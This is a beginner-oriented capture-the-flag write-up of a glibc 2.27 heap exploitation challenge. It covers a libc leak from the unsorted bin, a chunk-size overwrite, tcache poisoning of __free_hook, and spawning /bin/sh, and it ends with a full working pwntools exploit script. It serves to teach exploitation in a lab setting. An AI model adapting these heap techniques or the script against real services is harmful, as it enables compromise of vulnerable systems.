# Cyber Apocalypse CTF 2025: Tales from Eldoria

> ### Strategist
> To move forward, Sir Alaric requests each member of his team to present their most effective planning strategy. The individual with the strongest plan will be appointed as the Strategist for the upcoming war. Put forth your best effort to claim the role of Strategist!

- **Category**: Mwn 
- **Difficulty**: Medium
- **Author**: Cioppo


## Writeup
---
Credit to [him](https://www.hackthebox.com/blog/bon-nie-appetit-ca-ctf-2022-pwn-writeup), the challenge was pretty much the same, this is my own more beginner friendly version of the writeup as someone who learned a lot from this!

Protection:
```bash
> checksec strategist
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
```
We have full protection!

Let's look at what the binary does:
```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rax
  _QWORD plans[101]; // [rsp+0h] [rbp-330h] BYREF
  unsigned __int64 v5; // [rsp+328h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(plans, 0, 800uLL);
  banner();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = menu();
        if ( v3 != 2 )
          break;
        show_plan((__int64)plans);
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_13;
      create_plan((__int64)plans);
    }
    if ( v3 == 3 )
    {
      edit_plan((__int64)plans);
    }
    else
    {
      if ( v3 != 4 )
      {
LABEL_13:
        printf("%s\n[%sSir Alaric%s]: This plan will lead us to defeat!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
        exit(1312);
      }
      delete_plan((__int64)plans);
    }
  }
}
```
the application loop is in main, we have a ``menu`` with these options:
```
+-----------------+
| 1. Create  plan |
| 2. Show    plan |
| 3. Edit    plan |
| 4. Delete  plan |
+-----------------+

> 
```
Let's look at each option in order decompiled (I stripped out some stuff like printfs to not make this too long)

```C
unsigned __int64 __fastcall create_plan(__int64 plans)
{
  int size; // [rsp+18h] [rbp-18h] BYREF
  int first_index; // [rsp+1Ch] [rbp-14h]
  void *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  first_index = check(plans);
  if ( first_index == -1 ) { /*exit()*/ }
  size = 0;
  __isoc99_scanf("%d", &size);
  buf = malloc(size);
  if ( !buf ) { /*exit()*/ }
  read(0, buf, size);
  *(_QWORD *)(plans + 8LL * first_index) = buf;
  return __readfsqword(0x28u) ^ canary;
}
```
here it ask us for the ``size`` to ``malloc`` and let's us fill the buffer with wathever we want (let's remember that this doesn't put any ``0x00`` delimeter in the buffer!). The pointer to that buffer is save in the first avaible spot in the ``plans`` array.

```C
unsigned __int64 __fastcall show_plan(__int64 plans)
{
  signed int plan_index; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  plan_index = 0;
  __isoc99_scanf("%d", &plan_index);
  if ( (unsigned int)plan_index >= 100 || !*(_QWORD *)(8LL * plan_index + plans) ) { /*exit()*/ }
  printf(
    "[Sir Alaric]: Plan [%d]: %s\n",
    plan_index,
    *(const char **)(8LL * plan_index + plans));
  return __readfsqword(0x28u) ^ canary;
}
```
this function prints the content of the buffer with the ``%s`` format (su until a ``0x00`` byte), again the index is checked correctly.

```C
unsigned __int64 __fastcall edit_plan(__int64 plans)
{
  size_t size; // rax
  signed int plan_index; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  plan_index = 0;
  __isoc99_scanf("%d", &plan_index);
  if ( (unsigned int)plan_index >= 100 || !*(_QWORD *)(8LL * plan_index + plans) ) { /*exit()*/ }
  size = strlen(*(const char **)(8LL * plan_index + plans));
  read(0, *(void **)(8LL * plan_index + plans), size);
  return __readfsqword(0x28u) ^ canary;
}
```
here we can modify one of our plans, the index is taken correctly and the ``size`` of the ``buf`` is guessed with a ``strlen``, when we put the plan there in the first place the buffer wasn't ``0x00`` terminated so we could use this for some kind of out-of-bound write!

```C
unsigned __int64 __fastcall delete_plan(__int64 plans)
{
  signed int index; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  index = 0;
  __isoc99_scanf("%d", &index);
  if ( (unsigned int)index >= 0x64 || !*(_QWORD *)(8LL * index + plans) ) { /*exit()*/ }
  free(*(void **)(8LL * index + plans));
  *(_QWORD *)(8LL * index + plans) = 0LL;
  return __readfsqword(0x28u) ^ canary;
}
```
this is the last function, here we can ``free`` whatever plan we want, the index is taken correctly and the pointer is put tu ``0LL`` ( so no use after free! )

This is clearly some kind of heap exploitation (which I was completely new to before doing this challenge! :)), before thinking of anything, let's see what version of GLIBC we have:
```bash
> strings glibc/libc.so.6 | grep version
versionsort64
versionsort
argp_program_version_hook
gnu_get_libc_version
argp_program_version
RPC: Incompatible versions of RPC
RPC: Program/version mismatch
<malloc version="1">
Print program version
(PROGRAM ERROR) No version known!?
%s: %s; low version = %lu, high version = %lu
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
Compiled by GNU CC version 7.5.0.
version.c
versionsort.c
```
sweet! we have version ``2.27`` let's look here for some exploit we can do [how2heap](https://github.com/shellphish/how2heap/tree/master). In this case let's do [tcache_poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_poisoning.c).

This is our plan
 -  Leak a libc address, we can do this with some ``malloc`` tricks and the fact that what is read with ``read`` is not ``0x00`` terminated.
 -  Override ``__free_hook()`` with ``system()`` and call ``system("/bin/sh)`` with a ``free()``. We can use the out-of-bounds write we have and poison the tcache of the next chunk and change the size.

### Leak libc
---
First, let's see the man page of ``read``
```
DESCRIPTION
       read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.
       ....
```
this function reads to ``up to <count> bytes``, this means that if we send 2 bytes it will write 2 bytes and so. In our bynary this funciton is used like this in the ``create_plan()`` and ``edit_plan()`` function:
```C
read(0, buf, size)
```
with no kind of ``0x00`` termination.
Then let's remember how malloc works, I reccomend reading [this](https://heap-exploitation.dhavalkapil.com/) for people seeing these kind of exploits for the first time.
We can do something like this to make the third ``malloc`` give us the same address as the first:
```C
/* Ask malloc for 0x420 bytes*/
a = malloc(0x420);
/* We take something else so the first, when we call free(), will not consolidate with the top chunk */
b = malloc(8);

/* This free will put a in the unsorted bin (size is > 1056 byte) */
free(a);
free(b);

/* Here malloc will just give use the HEAD of the unsorted bin so a */
c = malloc(0x420);

assert(a == c)
```
When a chunk is deallocated (``free()``) it's put in a bin, in our case it's the ``unsorted bin`` which is a double linked list where the ``HEAD`` is somewhere predictable in the ``main_arena``.
This is a malloc_chunk:
```C
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk, if it is free. */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;                /* double links -- used only if this chunk is free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if this chunk is free. */
  struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
```
``fd`` will then be a valid libc address ( in our case it's ``main_arena+96`` ).
By this logic, in our third malloc (plan), when we get back the same address as the first, we can read that plan and leak the address!.

Let's watch this in action, this is the exploit I will be using (see end for full script):
```py
create_plan(0x410, b'a')
create_plan(8, b'b')
delete_plan(0)
delete_plan(1)
create_plan(0x410, b'\xa0') # Use pwndbg to get this byte, it's always the same!
leak = u64(show_plan(0).ljust(8, b"\x00"))
libc.address = leak - libc.sym.main_arena - 96
```

This is the heap before the ``free()``, we can see the size set and the dummy ``a`` we sent.
```py
# You can get this info with vis_heap_chunks in pwndbg
0x5ddc07101640	0x0000000000000000	0x0000000000000000	................
0x5ddc07101650	0x0000000000000000	0x0000000000000000	................
0x5ddc07101660	0x0000000000000000	0x0000000000000421	........!....... # Here is the size
0x5ddc07101670	0x0000000000000061	0x0000000000000000	a............... # Here is the address
0x5ddc07101680	0x0000000000000000	0x0000000000000000	................
0x5ddc07101690	0x0000000000000000	0x0000000000000000	................
0x5ddc071016a0	0x0000000000000000	0x0000000000000000	................
0x5ddc071016b0	0x0000000000000000	0x0000000000000000	................
```
This is after the ``free()``, we notice an address there and that it's pointed by ``unsortedbin[0]``
```py
0x5ddc07101640	0x0000000000000000	0x0000000000000000	................
0x5ddc07101650	0x0000000000000000	0x0000000000000000	................
0x5ddc07101660	0x0000000000000000	0x0000000000000421	........!.......	 <-- unsortedbin[all][0]
0x5ddc07101670	0x000075e1a13ebca0	0x000075e1a13ebca0	..>..u....>..u..
0x5ddc07101680	0x0000000000000000	0x0000000000000000	................
0x5ddc07101690	0x0000000000000000	0x0000000000000000	................
0x5ddc071016a0	0x0000000000000000	0x0000000000000000	................
0x5ddc071016b0	0x0000000000000000	0x0000000000000000	................
```
let's double check with this command:
```py
pwndbg> unsortedbin 
unsortedbin
all: 0x5ddc07101660 —▸ 0x75e1a13ebca0 (main_arena+96) ◂— 0x5ddc07101660
```
Here we can see that this is a poiter to the ``main_arena+96``, let's leak it!
```py
[*] Create plan of size 1040: b'a'
[*] Create plan of size 8: b'b'
[*] Delete plan 0
[*] Delete plan 1
[*] Create plan of size 1040: b'\xa0'
[*] Show plan 0
[+] Libc base: 0x75e1a1000000
```
Mind that you need to send that ``0xa0`` byte in the second plan because we will override the first byte (we cannot read 0 bytes :(), we are lucky that this remains the same every time!
We have the base of libc, now we can work as if PIE wasn't there!

### Call system
---
To call the system we will need a couple of steps, first let's remember how we can write out-of-bounds.
```C
unsigned __int64 __fastcall edit_plan(__int64 plans)
{
  // ...
  size = strlen(*(const char **)(8LL * plan_index + plans));
  read(0, *(void **)(8LL * plan_index + plans), size);
  return __readfsqword(0x28u) ^ canary;
}
```
If we just fill up the buffer we can write out of bounds for a bit (until a ``0x00``), for what we need to do we just need 1 byte (which we surely have because ``size`` is always set in a valid chunk).

Let's walk the exploit step by step (full code at the end)

We first create 3 plans of the same lenght and fill them, we are sure they will be adjacent.
```py
create_plan(0x48, b"x"*0x48)
create_plan(0x48, b"y"*0x48)
create_plan(0x48, b"z"*0x48)
```
Let's make sure of it from ``pwndbg``!
```py
0x5ddc07101660	0x0000000000000000	0x0000000000000051	........Q....... # First
0x5ddc07101670	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc07101680	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc07101690	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc071016a0	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc071016b0	0x7878787878787878	0x0000000000000051	xxxxxxxxQ....... # Second
0x5ddc071016c0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016d0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016e0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016f0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc07101700	0x7979797979797979	0x0000000000000051	yyyyyyyyQ....... # Third
0x5ddc07101710	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101720	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101730	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101740	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101750	0x7a7a7a7a7a7a7a7a	0x0000000000000331	zzzzzzzz1.......	 <-- unsortedbin[all][0]
0x5ddc07101760	0x000075e1a13ebca0	0x000075e1a13ebca0	..>..u....>..u..
```

Now let's overflow into the second chunk from the first and change it's size from ``0x51`` to ``0x80``
```py
edit_plan(0, b"x"*0x48 + p8(0x80))
```
Looking at the heap now: (``pwndbg`` will spam a bit, you can limit it with ``set max-visualize-chunk-size <n>``)
```py
0x5ddc07101660	0x0000000000000000	0x0000000000000051	........Q....... # First
0x5ddc07101670	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc07101680	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc07101690	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc071016a0	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc071016b0	0x7878787878787878	0x0000000000000080	xxxxxxxx........ # Second (new size!)
0x5ddc071016c0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016d0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016e0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016f0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc07101700	0x7979797979797979	0x0000000000000051	yyyyyyyyQ....... # Third
0x5ddc07101710	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101720	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101730	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101740	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101750	0x7a7a7a7a7a7a7a7a	0x0000000000000331	zzzzzzzz1.......	 <-- unsortedbin[all][0]
0x5ddc07101760	0x000075e1a13ebca0	0x000075e1a13ebca0	..>..u....>..u..
```
nice! we changed the size of the second chunk.

Let's now call free on the second and third chunks and see what happens
```py
delete_plan(1)
delete_plan(2)
```
This is the heap now:
```py
0x5ddc07101660	0x0000000000000000	0x0000000000000051	........Q....... # First
0x5ddc07101670	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc07101680	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc07101690	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc071016a0	0x7878787878787878	0x7878787878787878	xxxxxxxxxxxxxxxx
0x5ddc071016b0	0x7878787878787878	0x0000000000000080	xxxxxxxx........
0x5ddc071016c0	0x0000000000000000	0x00005ddc07101010	.............]..	 <-- tcachebins[0x80][0/1]
0x5ddc071016d0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016e0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016f0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc07101700	0x7979797979797979	0x0000000000000051	yyyyyyyyQ.......
0x5ddc07101710	0x0000000000000000	0x00005ddc07101010	.............]..	 <-- tcachebins[0x50][0/1]
0x5ddc07101720	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101730	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101740	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101750	0x7a7a7a7a7a7a7a7a	0x0000000000000331	zzzzzzzz1.......	 <-- unsortedbin[all][0]
0x5ddc07101760	0x000075e1a13ebca0	0x000075e1a13ebca0	..>..u....>..u..
```
We tricked the allocator in putting the second chunk in ``tcachebins[0x80]``!
In this situation we can make precise allocation to finish our exploit, this is the critical part so let's take it slowly!

Let's create a ``0x70`` chunk and put the address of ``__free_hook()`` in it, this is the address we want to trick malloc to give us.
```py
create_plan(0x70, b"y"*0x50 + p64(libc.sym.__free_hook))
```
The heap now (we can omit the first chunk)
```py
0x5ddc071016b0	0x7878787878787878	0x0000000000000080	xxxxxxxx........ # New chunk
0x5ddc071016c0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016d0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016e0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016f0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc07101700	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc07101710	0x000075e1a13ed8e8	0x00005ddc07101010	..>..u.......]..	 <-- tcachebins[0x50][0/1]
0x5ddc07101720	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101730	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101740	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101750	0x7a7a7a7a7a7a7a7a	0x0000000000000331	zzzzzzzz1.......	 <-- unsortedbin[all][0]
0x5ddc07101760	0x000075e1a13ebca0	0x000075e1a13ebca0	..>..u....>..u..
```
now the ``fd`` pointer of the old third chunk is set to our hook function
```py
pwndbg> heap 0x5ddc07101700 -s
0x5ddc07101700 | PREV_INUSE
prev_size: <junk>
size: <junk> (with flag bits: <junk>)
fd: 0x75e1a13ed8e8 # <----
bk: 0x5ddc07101010
fd_nextsize: <junk>
bk_nextsize: <junk>

pwndbg> tcachebins 
tcachebins
0x20 [  1]: 0x5ddc07101a90 ◂— 0x0
0x50 [  1]: 0x5ddc07101710 —▸ 0x75e1a13ed8e8 (__free_hook) ◂— ...
0x410 [  1]: 0x5ddc07101260 ◂— 0x0
```

Let's create yet another plan, this will use the one in the bin and so, the next one, will be our write! In this one we can put ``/bin/sh`` to "``free()``" later ;)
```py
create_plan(0x40, b"/bin/sh\x00")
```
```py
0x5ddc071016b0	0x7878787878787878	0x0000000000000080	xxxxxxxx........
0x5ddc071016c0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016d0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016e0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc071016f0	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy
0x5ddc07101700	0x7979797979797979	0x7979797979797979	yyyyyyyyyyyyyyyy # New chunk
0x5ddc07101710	0x0068732f6e69622f	0x0000000000000000	/bin/sh......... # /bin/sh
0x5ddc07101720	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101730	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101740	0x7a7a7a7a7a7a7a7a	0x7a7a7a7a7a7a7a7a	zzzzzzzzzzzzzzzz
0x5ddc07101750	0x7a7a7a7a7a7a7a7a	0x0000000000000331	zzzzzzzz1.......	 <-- unsortedbin[all][0]
0x5ddc07101760	0x000075e1a13ebca0	0x000075e1a13ebca0	..>..u....>..u..

pwndbg> tcachebins 
tcachebins
0x20 [  1]: 0x5ddc07101a90 ◂— 0x0
0x50 [  0]: 0x75e1a13ed8e8 (__free_hook) ◂— ...
0x410 [  1]: 0x5ddc07101260 ◂— 0x0
```
Now the next call will write on the ``__free_hook()``
```py
create_plan(0x40, p64(libc.sym.system))
```
Nice!
```py
pwndbg> p __free_hook
$2 = (void (*)(void *, const void *)) 0x75e1a104f550 <__libc_system>
```

Let's finaly call the shell with a ``free``, this will run ``__free_hook()`` so running ``system()`` with our juicy ``/bin/sh``!
```
delete_plan(2)
```
And just like this we have the flag :)

### Full exploit
---
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("strategist")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = exe
#context.log_level = "debug"

global r
def conn():
    global r
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], "b *main+61")
    else:
        r = remote("addr", 1337)

    return r

def create_plan(size: int, plan: bytes):
    r.sendlineafter(b"> ", b"1")
    info(f"Create plan of size {size}: {str(plan)}")
    r.sendlineafter(b"> ", str(size).encode())
    r.sendafter(b"> ", plan)

def show_plan(index: int):
    r.sendlineafter(b"> ", b"2")
    info(f"Show plan {index}")
    r.sendlineafter(b"> ", str(index).encode())
    r.recvuntil(str(index).encode() + b"]: ")
    return r.recvline(False)

def edit_plan(index: int, plan: bytes):
    r.sendlineafter(b"> ", b"3")
    info(f"Edit plan {index} to: {str(plan)}")
    r.sendlineafter(b"> ", str(index).encode())
    r.sendafter(b"> ", plan)

def delete_plan(index: int):
    r.sendlineafter(b"> ", b"4")
    info(f"Delete plan {index}")
    r.sendlineafter(b"> ", str(index).encode())

def main():
    conn()

    # Leak libc base
    create_plan(0x410, b'a')
    create_plan(8, b'b')
    delete_plan(0)
    delete_plan(1)
    create_plan(0x410, b'\xa0') # Use pwndbg to get this byte, it's always the same!
    leak = u64(show_plan(0).ljust(8, b"\x00"))
    libc.address = leak - libc.sym.main_arena - 96
    success(f'Libc base: {hex(libc.address)}')
    delete_plan(0)

    # Hook system to free
    create_plan(0x48, b"A"*0x48)
    create_plan(0x48, b"B"*0x48)
    create_plan(0x48, b"C"*0x48)
    edit_plan(0, b"A"*0x48 + p8(0x80))
    delete_plan(1)
    delete_plan(2)
    create_plan(0x70, b"C"*0x50 + p64(libc.sym.__free_hook))
    create_plan(0x40, b"/bin/sh\x00")
    create_plan(0x40, p64(libc.sym.system))
    delete_plan(2)

    #Win
    r.interactive()

if __name__ == "__main__":
    main()
```